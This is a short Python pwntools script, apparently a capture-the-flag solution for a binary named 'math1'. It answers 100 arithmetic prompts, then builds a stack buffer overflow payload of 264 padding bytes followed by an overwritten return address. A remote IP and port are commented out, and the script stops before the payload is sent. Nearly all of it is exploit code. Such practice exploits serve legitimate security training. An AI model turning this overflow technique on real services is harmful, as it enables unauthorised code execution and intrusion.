from pwn import *

elf = ELF('./math1')
#p = remote('104.199.120.115', 17073)
p = process('./math1')

print p.recvline()
for i in range(0,100):
    a = p.recv()
    print a
    res=int(a.split()[0],10)+int(a.split()[2],10)
    p.sendline(str(res))
    i+=1

print p.recv()
payload='A'*264
payload+=p64(0x40186b)
